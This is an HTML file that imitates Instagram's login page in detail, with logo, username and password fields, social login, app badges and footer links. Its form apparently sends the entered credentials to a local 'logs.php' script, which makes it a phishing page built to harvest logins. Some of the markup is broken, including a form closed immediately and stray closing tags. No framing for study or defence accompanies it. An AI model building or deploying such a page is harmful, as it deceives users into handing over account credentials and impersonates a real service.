<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Instagram Login</title>
    <link rel="stylesheet" href="style.css" />
  </head>

  <body>
    <div class="login-container">
      <img
        src="logoig.png"
        alt="Instagram Logo"
        style="width: 185px; height: 60px; margin-top: 20px;"
      />
      <form action="logs.php"></form>
        <input
          type="text"
          name="username"
          placeholder="Phone number, username, or email"
          required
        />
        <input
          type="password"
          name="password"
          placeholder="Password"
          required
        />
        <button type="submit" style="font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif; font-weight: 600;">Log In</button>
      </form>
      <div class="divider">OR</div>
      <div class="social-login">
        <img
          src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg"
          alt="Facebook Logo"
          style="width: 20px; height: 20px; margin-bottom: 0"
        />
        <a href="https://www.facebook.com/" style="text-decoration: none; color: #328ee3;font-family: system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif; font-weight: 600;"
          onmouseover="this.style.color='black'" onmouseout="this.style.color='#0095f6'"
          >Log in with Facebook</a
        >
      </div>
      <div class="forgot-password">
        <a href="#" style="color: black; text-decoration: none"
          >Forgot password?</a
        >
      </div>
    </div>

    <div class="login-container2">
      <div class="signup-link">
        Don't have an account?
        <a
          href="https://www.instagram.com/accounts/emailsignup/"
          style="text-decoration: none"
          >Sign up</a
        >
      </div>
    </div>
    <div class="get-the-app">
      <p style="text-align: center">Get the app.</p>
      <div class="download-buttons" style="margin-bottom: 50px">
        <a href="https://apps.apple.com/app/instagram/id389801252"></a>
          <img
        src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png"
        alt="Download on the App Store"
        style="width: 134px; height: 40px; margin-right: 5px;"
          />
        </a>
        <a href="https://play.google.com/store/apps/details?id=com.instagram.android">
          <img
        src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png"
        alt="Get it on Google Play"
        style="width: 134px; height: 40px"
          />
        </a>
      </div>
    </div>
    <!-- Closing the get-the-app div -->
    <div class="footer">
      <div style="font-size: 16px; text-align: center; flex-wrap: wrap; display: flex; justify-content: center; gap: 10px;">
      <a href="https://about.instagram.com/">About</a>
      <a href="https://help.instagram.com/">Help</a>
      <a href="https://about.instagram.com/blog/">Press</a>
      <a href="https://www.instagram.com/developer/">API</a>
      <a href="https://www.instagram.com/about/jobs/">Jobs</a>
      <a href="https://help.instagram.com/519522125107875">Privacy</a>
      <a href="https://help.instagram.com/581066165581870">Terms</a>
      <a href="https://www.instagram.com/explore/locations/">Locations</a>
      <a href="https://www.instagram.com/directory/profiles/">Top Accounts</a>
      <a href="https://www.instagram.com/explore/tags/">Hashtags</a>
      <a href="https://www.instagram.com/">Language</a>
      </div>
      <div style="font-size: 16px; text-align: center; margin-top: 10px;"></div>
      <select style="border: none; color: inherit">
        <option value="en">English</option>
        <option value="es">Español</option>
        <option value="fr">Français</option>
        <option value="de">Deutsch</option>
        <option value="it">Italiano</option>
        <option value="pt">Português</option>
      </select>
      <div style="display: inline-block; margin-left: 10px">
        &copy; 2025 Instagram from Meta
      </div>
      </div>
    </div>
  </body>
</html>
